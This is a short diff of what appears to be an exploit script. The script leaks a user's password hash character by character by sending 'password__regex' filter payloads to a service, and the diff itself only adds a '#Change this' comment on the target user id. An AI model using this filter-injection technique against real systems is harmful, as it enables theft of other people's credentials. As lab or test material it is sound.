@@ -28,7 +28,7 @@ def test_regex(hash_value):
                 test_hash = correct_hash[:i] + case_char + correct_hash[i+1:]
                 regex = generate_regex(test_hash, i)
                 payload = {
-                    "id": "2",
+                    "id": "2",                #Change this
                     "password__regex": f"^{regex}"
                 }
                 print(f"Trying regex: ^{regex}")
